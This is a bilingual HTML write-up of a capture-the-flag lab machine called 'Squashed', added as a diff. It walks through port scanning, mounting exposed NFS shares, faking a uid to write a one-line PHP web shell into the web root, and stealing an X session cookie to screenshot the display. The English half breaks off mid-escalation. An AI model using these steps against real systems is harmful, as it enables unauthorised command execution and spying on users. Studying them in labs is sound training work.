@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Alejandro García Peláez" />
+  <title>Squashed Machine</title>
+  <script src="/src/translation.min.js" defer></script>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 14pt;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">Squashed Machine</h1>
+<p class="author">Alejandro García Peláez</p>
+<p class="date">01-03-2023</p>
+
+<div id="buttons" style="display: grid; justify-content: center;">
+  <button class="spanish button-class" id="lang-en" type="button"> English </button>
+  <button class="english button-class" id="lang-es" type="button"> Español </button>
+</div>
+
+</header>
+<div class="spanish">
+<ul>
+<li><a href="#reconocimiento">Reconocimiento</a><br></li>
+<li><a href="#obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso
+a la máquina víctima</a><br>
+<ul>
+<li><a href="#intento-con-keepass-database-file-kdbx">Intento con
+Keepass database file (kdbx)</a><br></li>
+<li><a href="#rce-web-shell-en-php">RCE web-shell en php</a><br></li>
+</ul></li>
+<li><a href="#escalada-de-privilegios">Escalada de
+privilegios</a><br></li>
+</ul>
+</div>
+<div class="english">
+<ul>
+<li><a href="#recognition">Recognition</a><br></li>
+<li><a href="#gaining-access-to-the-target-machine">Gaining access to
+the target machine</a><br>
+<ul>
+<li><a href="#attempt-with-keepass-database-file-kdbx">Attempt with
+Keepass database file (kdbx)</a><br></li>
+<li><a href="#rce-web-shell-on-php">RCE web-shell on php</a><br></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a><br></li>
+</ul>
+</div>
+<div class="spanish">
+<h1 id="reconocimiento">Reconocimiento</h1>
+<p>Empezamos con nmap para ver los puertos abiertos de la máquina:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>  <span class="fu">nmap</span> <span class="at">-p-</span> <span class="at">--open</span> <span class="at">-T5</span> <span class="at">-n</span> <span class="at">-Pn</span> 10.10.11.191 <span class="at">-oG</span> openTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:38 CET
+Nmap scan report for 10.10.11.191
+Host is up (0.046s latency).
+Not shown: 62200 closed tcp ports (conn-refused), 3328 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+37295/tcp open  unknown
+39085/tcp open  unknown
+40725/tcp open  unknown
+41253/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds</code></pre>
+<p>Extraemos los puertos obtenidos</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">grePorts</span></span></code></pre></div>
+<p><br></p>
+<pre><code> [!] Open ports: 22,80,111,37295,39085,40725,41253</code></pre>
+<p>Ahora ejecutamos un conjunto de scripts de reconocimiento
+predefinidos por nmap para recopilar información sobre los servicios
+expuestos en la máquina objetivo.</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p22,80,111,37295,39085,40725,41253</span> <span class="at">-sVC</span> 10.10.11.191 <span class="at">-oN</span> openTCPservices</span></code></pre></div>
+<p><br></p>
+<pre><code>PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Built Better
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      33076/udp6  mountd
+|   100005  1,2,3      37295/tcp   mountd
+|   100005  1,2,3      37554/udp   mountd
+|   100005  1,2,3      48007/tcp6  mountd
+|   100021  1,3,4      33429/udp6  nlockmgr
+|   100021  1,3,4      34107/tcp6  nlockmgr
+|   100021  1,3,4      40725/tcp   nlockmgr
+|   100021  1,3,4      41020/udp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+37295/tcp open  mountd   1-3 (RPC #100005)
+39085/tcp open  mountd   1-3 (RPC #100005)
+40725/tcp open  nlockmgr 1-4 (RPC #100021)
+41253/tcp open  mountd   1-3 (RPC #100005)</code></pre>
+<p>Antes de indigar más en los volúmenes NFS echaremos un vistazo a la
+página web.</p>
+<h1 id="obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la
+máquina víctima</h1>
+<p>La página web en sí no parece tener mucha información; es la típica
+página modelo que nos solemos encontrar. Parece que hay una sección de
+login pero no nos lleva a ningún lado.</p>
+<p>Vamos a echarle un vistazo entonces a RPC y en paralelo dejaremos
+trabajando gobuster para encontrar algún recurso en la web.</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">gobuster</span> dir <span class="at">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="at">-u</span> http://10.10.11.191</span></code></pre></div>
+<p>Listamos los recursos compartidos a nivel de red en el equipo
+objetivo.</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">showmount</span> <span class="at">-e</span> 10.10.11.191</span></code></pre></div>
+<p><br></p>
+<pre><code>Export list for 10.10.11.191:
+/home/ross    *
+/var/www/html *</code></pre>
+<p>Creamos un punto de montaje y montamos el volumen compartido:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>  <span class="fu">mkdir</span> /mnt/ross <span class="kw">;</span> <span class="fu">mount</span> <span class="at">-t</span> nfs 10.10.11.191:/home/ross /mnt/ross</span></code></pre></div>
+<h2 id="intento-con-keepass-database-file-kdbx">Intento con Keepass
+database file (kdbx)</h2>
+<p>Listamos los recursos del volumen montado:</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>  <span class="ex">tree</span> /mnt/ross</span></code></pre></div>
+<p><br></p>
+<pre><code>/mnt/ross
+├── Desktop
+├── Documents
+│   └── Passwords.kdbx
+├── Downloads
+├── Music
+├── Pictures
+├── Public
+├── Templates
+└── Videos</code></pre>
+<p>Nos interesa el archivo con extensión “kdbx” perteneciente al
+software gestor de contraseñas KeePass.</p>
+<p>Lo traemos a nuestro equipo y lanzamos “keepass2john”:</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>  <span class="ex">keepass2john</span> Password.kdbx </span></code></pre></div>
+<p>Sin embargo …</p>
+<pre><code>   ! Passwords.kdbx : File version &#39;40000&#39; is currently not supported!</code></pre>
+<p>Creamos un pequeño script en bash para usar una herramienta cli para
+encontrar la contraseña por fuerza bruta (disponible en la página de
+scripts).</p>
+<p>La velocidad es muy lenta, aunque se paralelice por lo que me hace
+pensar que el fichero es un agujero sin salida, puesto ahí para
+distraer.</p>
+<h2 id="rce-web-shell-en-php">RCE web-shell en php</h2>
+<p>Dado que parece que no hay nada de interés en este volumen, montamos
+el otro volumen, igual que antes:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">mkdir</span> /mnt/html <span class="kw">;</span> <span class="fu">mount</span> <span class="at">-t</span> nfs 10.10.11.191:/var/www/html /mnt/html</span></code></pre></div>
+<p>En principio no podemos acceder al directorio. Con el comando
+<code>ls -l</code> vemos que el dueño es un usuario con uid 2017 por lo
+que ejecutamos:</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">useradd</span> squash <span class="at">-u</span> 2017 <span class="at">-m</span> <span class="at">-s</span> /bin/bash <span class="kw">;</span> <span class="fu">sudo</span> <span class="at">-u</span> squash bash</span></code></pre></div>
+<p>Pudiendo acceder ya a la carpeta en cuestión, vamos a comprobar con
+la creación de un fichero de prueba para ver si lo podemos ver.</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a> <span class="bu">echo</span> <span class="st">&quot;Hello! This is a test.!&quot;</span> <span class="op">&gt;</span> test.html</span></code></pre></div>
+<p><img src="images/squashed1.png" /></p>
+<p>Efectivamente podemos acceder al archivo, así que veamos si podemos
+hacer lo mismo con php.</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>  <span class="bu">echo</span> <span class="st">&quot;&lt;pre&gt;&lt;?php phpinfo(); ?&gt;&lt;pre&gt;&quot;</span> <span class="op">&gt;</span> info.php</span></code></pre></div>
+<p>Y efectivamente:</p>
+<p><img src="images/squashed2.png" /></p>
+<p>Con esto ya podemos establecer una web shell que medinte GET obtenga
+el comando que queramos ejecutar en la máquina objetivo.</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="st">&quot;&lt;pre&gt;&quot;</span><span class="op">.</span> <span class="fu">shell_exec</span>(<span class="va">$_GET</span>[<span class="st">&quot;cmd&quot;</span>]) <span class="op">.</span> <span class="st">&quot; &lt;/pre&gt;&quot;</span><span class="ot">;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+<p>Una vez ganado el acceso al sistema, nos interesa volver un poco
+atrás y echar un vistazo al directorio de ross, donde vemos algo que nos
+puede ser de utilidad para la escalada:</p>
+<p><img src="images/squashed4.png" /></p>
+<p><img src="images/squashed5.png" /></p>
+<p>Copiamos el fichero a nuestro usuario actual, para ver si podemos
+hacer una captura de pantalla.</p>
+<p>Si ejecutamos el siguiente comando, veremos que obtenemos que no hay
+ninguna pantalla disponible:</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">xdpyinfo</span> <span class="at">-display</span> :0</span></code></pre></div>
+<p><br></p>
+<pre><code> xdpyinfo:  unable to open display &quot;:0&quot;.</code></pre>
+<p>Sin embargo no nos deja descargarlo. Tras investigar un poco parece
+ser porque no tenemos los permisos suficientes, por lo que nos
+aprovechamos de la montura nfs y la gestionamos con un usuario cuyo uid
+sea 1001.</p>
+<p>Con el fichero “.Xauthority” en nuestro usuario actual, volvemos a
+ejecutar el comando anterior y …</p>
+<pre><code>xdpyinfo -display :0
+name of display:    :0
+version number:    11.0
+vendor string:    The X.Org Foundation
+vendor release number:    12013000
+X.Org version: 1.20.13
+maximum request size:  16777212 bytes
+motion buffer size:  256
+bitmap unit, bit order, padding:    32, LSBFirst, 32
+image byte order:    LSBFirst
+...</code></pre>
+<p>No olvidemos que hay que darle valor a la variable HOME porque si no
+no sabrá donde está el fichero.</p>
+<p>Hacemos una captura:</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">xwd</span> <span class="at">-root</span> <span class="at">-screen</span> <span class="at">-silent</span> <span class="at">-display</span> :0 <span class="op">&gt;</span> file.xwd</span></code></pre></div>
+<p>Nos la pasamos a nuestro equipo y:</p>
+<p><img src="images/squashed6.png" /></p>
+</div>
+<div class="english">
+<h1 id="recognition">Recognition</h1>
+<p>We start with nmap to see the open ports of the machine:</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a>  <span class="fu">nmap</span> <span class="at">-p-</span> <span class="at">--open</span> <span class="at">-T5</span> <span class="at">-n</span> <span class="at">-Pn</span> 10.10.11.191 <span class="at">-oG</span> openTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 11:38 CET
+Nmap scan report for 10.10.11.191
+Host is up (0.046s latency).
+Not shown: 62200 closed tcp ports (conn-refused), 3328 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+37295/tcp open  unknown
+39085/tcp open  unknown
+40725/tcp open  unknown
+41253/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds</code></pre>
+<p>We extract the obtained ports</p>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">grePorts</span></span></code></pre></div>
+<p><br></p>
+<pre><code> [!] Open ports: 22,80,111,37295,39085,40725,41253</code></pre>
+<p>We now run a set of reconnaissance scripts predefined by nmap to
+gather information about the services exposed on the target machine.</p>
+<div class="sourceCode" id="cb28"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p22,80,111,37295,39085,40725,41253</span> <span class="at">-sVC</span> 10.10.11.191 <span class="at">-oN</span> openTCPservices</span></code></pre></div>
+<p><br></p>
+<pre><code>PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Built Better
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      33076/udp6  mountd
+|   100005  1,2,3      37295/tcp   mountd
+|   100005  1,2,3      37554/udp   mountd
+|   100005  1,2,3      48007/tcp6  mountd
+|   100021  1,3,4      33429/udp6  nlockmgr
+|   100021  1,3,4      34107/tcp6  nlockmgr
+|   100021  1,3,4      40725/tcp   nlockmgr
+|   100021  1,3,4      41020/udp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+37295/tcp open  mountd   1-3 (RPC #100005)
+39085/tcp open  mountd   1-3 (RPC #100005)
+40725/tcp open  nlockmgr 1-4 (RPC #100021)
+41253/tcp open  mountd   1-3 (RPC #100005)</code></pre>
+<p>Before we dig deeper into the NFS volumes, let’s take a look at the
+website.</p>
+<h1 id="gaining-access-to-the-target-machine">Gaining access to the
+target machine</h1>
+<p>The web page itself doesn’t seem to have much information; it is the
+typical model page that we usually find. There seems to be a login
+section but it doesn’t take us anywhere.</p>
+<p>So let’s take a look at RPC and in parallel we’ll leave gobuster
+working to find some resources on the web.</p>
+<div class="sourceCode" id="cb30"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">gobuster</span> dir <span class="at">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="at">-u</span> http://10.10.11.191</span></code></pre></div>
+<p>We list the shared resources at the network level on the target
+computer.</p>
+<div class="sourceCode" id="cb31"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">showmount</span> <span class="at">-e</span> 10.10.11.191</span></code></pre></div>
+<p><br></p>
+<pre><code>Export list for 10.10.11.191:
+/home/ross    *
+/var/www/html *</code></pre>
+<p>We create a mount point and mount the shared volume:</p>
+<div class="sourceCode" id="cb33"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>  <span class="fu">mkdir</span> /mnt/ross <span class="kw">;</span> <span class="fu">mount</span> <span class="at">-t</span> nfs 10.10.11.191:/home/ross /mnt/ross</span></code></pre></div>
+<h2 id="attempt-with-keepass-database-file-kdbx">Attempt with Keepass
+database file (kdbx)</h2>
+<p>We list the resources of the mounted volume:</p>
+<div class="sourceCode" id="cb34"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>  <span class="ex">tree</span> /mnt/ross</span></code></pre></div>
+<p><br></p>
+<pre><code>/mnt/ross
+├── Desktop
+├── Documents
+│   └── Passwords.kdbx
+├── Downloads
+├── Music
+├── Pictures
+├── Public
+├── Templates
+└── Videos</code></pre>
+<p>We are interested in the file with extension “kdbx” belonging to the
+KeePass password manager software.</p>
+<p>We bring it to our computer and launch “keepass2john”:</p>
+<div class="sourceCode" id="cb36"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a>  <span class="ex">keepass2john</span> Password.kdbx </span></code></pre></div>
+<p>However …</p>
+<pre><code>   ! Passwords.kdbx : File version &#39;40000&#39; is currently not supported!</code></pre>
+<p>We created a small bash script to use a cli tool to find the password
+by brute force (available on the scripts page).</p>
+<p>The speed is very slow, even though it freezes so it makes me think
+that the file is a dead-end hole, put there to distract.</p>
+<h2 id="rce-web-shell-on-php">RCE web-shell on php</h2>
+<p>Since there seems to be nothing of interest in this volume, we mount
+the other volume, just as before:</p>
+<div class="sourceCode" id="cb38"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">mkdir</span> /mnt/html <span class="kw">;</span> <span class="fu">mount</span> <span class="at">-t</span> nfs 10.10.11.191:/var/www/html /mnt/html</span></code></pre></div>
+<p>In principle we can not access the directory. With the command
+<code>ls -l</code> we see that the owner is a user with uid 2017 so we
+execute:</p>
+<div class="sourceCode" id="cb39"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">useradd</span> squash <span class="at">-u</span> 2017 <span class="at">-m</span> <span class="at">-s</span> /bin/bash <span class="kw">;</span> <span class="fu">sudo</span> <span class="at">-u</span> squash bash</span></code></pre></div>
+<p>Now that we can access the folder in question, let’s test by creating
+a test file to see if we can see it.</p>
+<div class="sourceCode" id="cb40"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a> <span class="bu">echo</span> <span class="st">&quot;Hello! This is a test.!&quot;</span> <span class="op">&gt;</span> test.html</span></code></pre></div>
+<p><img src="images/squashed1.png" /></p>
+<p>We can indeed access the file, so let’s see if we can do the same
+with php.</p>
+<div class="sourceCode" id="cb41"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a>  <span class="bu">echo</span> <span class="st">&quot;&lt;pre&gt;&lt;?php phpinfo(); ?&gt;&lt;pre&gt;&quot;</span> <span class="op">&gt;</span> info.php</span></code></pre></div>
+<p>And:</p>
+<p><img src="images/squashed2.png" /></p>
+<p>With this we can now set up a web shell that will GET the command we
+want to execute on the target machine.</p>
+<div class="sourceCode" id="cb42"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="st">&quot;&lt;pre&gt;&quot;</span><span class="op">.</span> <span class="fu">shell_exec</span>(<span class="va">$_GET</span>[<span class="st">&quot;cmd&quot;</span>]) <span class="op">.</span> <span class="st">&quot; &lt;/pre&gt;&quot;</span><span class="ot">;</span></span>
+<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Once we have gained access to the system, we are interested in going
+back a bit and taking a look at the ross directory, where we see
+something that may be useful for climbing:</p>
+<p><img src="images/squashed4.png" /></p>
+<p><img src="images/squashed5.png" /></p>
+<p>We copy the file to our current user, to see if we can take a
+screenshot.</p>
+<p>If we run the following command, we will see that we get that there
+is no screen available:</p>
+<div class="sourceCode" id="cb43"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">xdpyinfo</span> <span class="at">-display</span> :0</span></code></pre></div>
+<p><br></p>
+<pre><code> xdpyinfo:  unable to open display &quot;:0&quot;.</code></pre>
+<p>However it does not let us download it. After some research it seems
+that we do not have enough permissions, so we take advantage of the nfs
+mount and manage it with a user whose uid is 1001.</p>
